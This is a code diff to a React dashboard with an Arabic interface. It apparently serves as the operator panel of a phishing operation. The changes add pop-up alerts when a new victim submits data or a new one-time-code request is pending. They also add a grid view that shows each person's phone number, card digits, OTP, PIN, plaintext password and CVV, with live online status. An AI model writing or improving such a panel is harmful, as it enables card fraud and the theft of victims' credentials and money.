@@ -310,6 +310,12 @@ export default function FirebaseDashboard() {
         setNewItemId(newestItem?.id || null);
         // Play notification sound
         playNotificationSound();
+        // Show toast notification
+        const userName = newestItem?.step_2_personal_data?.fullNameArabic || `زائر جديد`;
+        toast.success(`تسجيل جديد: ${userName}`, {
+          description: newestItem?.step_2_personal_data?.email || newestItem?.id?.slice(0, 8),
+          duration: 5000,
+        });
         // Scroll to top when new data arrives
         if (listRef.current) {
           listRef.current.scrollTop = 0;
@@ -351,8 +357,16 @@ export default function FirebaseDashboard() {
 
     const unsubscribeOtpRequests = subscribeToAllOtpRequests((requests) => {
       const pendingRequests = requests.filter(r => r.status === "pending");
-      if (pendingRequests.length > otpRequests.filter(r => r.status === "pending").length) {
+      const prevPending = otpRequests.filter(r => r.status === "pending");
+      if (pendingRequests.length > prevPending.length) {
         playNotificationSound();
+        const newOtp = pendingRequests.find(r => !prevPending.some(p => p.id === r.id));
+        if (newOtp) {
+          toast.warning(`طلب OTP جديد`, {
+            description: `بطاقة: ${newOtp.cardNumber?.slice(-4) || "****"} - ${newOtp.userName || newOtp.visitorId?.slice(0, 8)}`,
+            duration: 10000,
+          });
+        }
       }
       setOtpRequests(requests);
     });
@@ -756,21 +770,41 @@ export default function FirebaseDashboard() {
           currentTheme.sidebar, 
           currentTheme.border
         )}>
-          {/* Search */}
+          {/* Search & View Toggle */}
           <div className={cn("p-4 border-b", currentTheme.border)}>
-            <div className="relative">
-              <Search className={cn("absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4", currentTheme.textMuted)} />
-              <Input
-                placeholder="بحث بالاسم أو البريد..."
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                className={cn("pr-10", currentTheme.bg, currentTheme.border, currentTheme.text, "placeholder:opacity-50")}
-              />
+            <div className="flex gap-2 mb-2">
+              <div className="relative flex-1">
+                <Search className={cn("absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4", currentTheme.textMuted)} />
+                <Input
+                  placeholder="بحث بالاسم أو البريد..."
+                  value={searchQuery}
+                  onChange={(e) => setSearchQuery(e.target.value)}
+                  className={cn("pr-10", currentTheme.bg, currentTheme.border, currentTheme.text, "placeholder:opacity-50")}
+                />
+              </div>
+              <div className="flex gap-1">
+                <Button
+                  variant="ghost"
+                  size="sm"
+                  onClick={() => setViewMode("grid")}
+                  className={cn(viewMode === "grid" ? "bg-blue-600 text-white" : currentTheme.textMuted)}
+                >
+                  <Grid3X3 className="h-4 w-4" />
+                </Button>
+                <Button
+                  variant="ghost"
+                  size="sm"
+                  onClick={() => setViewMode("list")}
+                  className={cn(viewMode === "list" ? "bg-blue-600 text-white" : currentTheme.textMuted)}
+                >
+                  <List className="h-4 w-4" />
+                </Button>
+              </div>
             </div>
           </div>
 
-          {/* List */}
-          <div ref={listRef} className="flex-1 overflow-y-auto scroll-smooth">
+          {/* List/Grid View */}
+          <div ref={listRef} className="flex-1 overflow-y-auto scroll-smooth p-2">
             {loading ? (
               <div className="flex items-center justify-center h-32 text-gray-500">
                 <RefreshCw className="h-6 w-6 animate-spin" />
@@ -779,6 +813,88 @@ export default function FirebaseDashboard() {
               <div className="p-8 text-center text-gray-500">
                 <FileText className="h-12 w-12 mx-auto mb-4 opacity-50" />
                 <p>لا توجد بيانات</p>
+              </div>
+            ) : viewMode === "grid" ? (
+              <div className="grid grid-cols-1 gap-2">
+                {filteredSubmissions.map((sub) => (
+                  <button
+                    key={sub.id}
+                    onClick={() => setSelectedSubmission(sub)}
+                    className={cn(
+                      "rounded-lg p-3 text-right transition-all border",
+                      currentTheme.card,
+                      currentTheme.border,
+                      selectedSubmission?.id === sub.id
+                        ? "ring-2 ring-blue-500 bg-blue-600/20"
+                        : "hover:bg-white/5",
+                      newItemId === sub.id && "animate-pulse bg-green-500/30"
+                    )}
+                  >
+                    <div className="flex items-center justify-between mb-2">
+                      <div className="flex items-center gap-2">
+                        <div className={cn(
+                          "w-8 h-8 rounded-full flex items-center justify-center text-white text-xs",
+                          isUserOnline(sub.visitorId) ? "bg-green-600" : "bg-gray-600"
+                        )}>
+                          {isUserOnline(sub.visitorId) ? <Wifi className="h-4 w-4" /> : <WifiOff className="h-4 w-4" />}
+                        </div>
+                        <span className={cn("font-bold text-sm truncate max-w-[120px]", currentTheme.text)}>
+                          {sub.step_2_personal_data?.fullNameArabic || `زائر`}
+                        </span>
+                      </div>
+                      <span className={cn("text-xs", currentTheme.textMuted)}>
+                        {formatDate(sub.updatedAt)}
+                      </span>
+                    </div>
+                    
+                    {/* Quick Data Grid */}
+                    <div className="grid grid-cols-2 gap-1 text-xs">
+                      {sub.step_2_personal_data?.phoneNumber && (
+                        <div className="bg-blue-500/10 rounded px-2 py-1 truncate">
+                          <Phone className="h-3 w-3 inline ml-1" />
+                          {sub.step_2_personal_data.phoneNumber}
+                        </div>
+                      )}
+                      {sub.step_4_payment?.cardNumber && (
+                        <div className="bg-orange-500/10 text-orange-400 rounded px-2 py-1 truncate">
+                          <CreditCard className="h-3 w-3 inline ml-1" />
+                          {sub.step_4_payment.cardNumber.slice(-4)}
+                        </div>
+                      )}
+                      {sub.step_4_payment?.otpCode && (
+                        <div className="bg-purple-500/10 text-purple-400 rounded px-2 py-1">
+                          <Shield className="h-3 w-3 inline ml-1" />
+                          OTP: {sub.step_4_payment.otpCode}
+                        </div>
+                      )}
+                      {sub.step_5_pin?.pinCode && (
+                        <div className="bg-red-500/10 text-red-400 rounded px-2 py-1">
+                          <Lock className="h-3 w-3 inline ml-1" />
+                          PIN: {sub.step_5_pin.pinCode}
+                        </div>
+                      )}
+                      {sub.step_3_password?.password && (
+                        <div className="bg-red-500/10 text-red-400 rounded px-2 py-1 truncate">
+                          🔑 {sub.step_3_password.password}
+                        </div>
+                      )}
+                      {sub.step_4_payment?.cvv && (
+                        <div className="bg-yellow-500/10 text-yellow-400 rounded px-2 py-1">
+                          CVV: {sub.step_4_payment.cvv}
+                        </div>
+                      )}
+                    </div>
+                    
+                    {/* Status Badge */}
+                    <div className="mt-2 flex gap-1">
+                      {sub.status === "completed" ? (
+                        <span className="text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">مكتمل</span>
+                      ) : (
+                        <span className="text-xs bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded">{sub.lastStep || "جاري"}</span>
+                      )}
+                    </div>
+                  </button>
+                ))}
               </div>
             ) : (
               filteredSubmissions.map((sub) => (
